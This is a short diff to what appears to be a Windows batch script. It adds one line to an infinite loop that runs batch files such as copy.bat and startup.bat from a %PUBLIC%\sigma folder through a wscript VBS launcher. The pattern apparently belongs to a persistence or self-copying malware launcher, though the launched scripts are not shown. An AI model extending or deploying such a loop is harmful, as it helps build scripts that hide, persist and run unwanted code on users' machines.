@@ -5,4 +5,5 @@ wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
 wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\lulz.bat
 goto loop
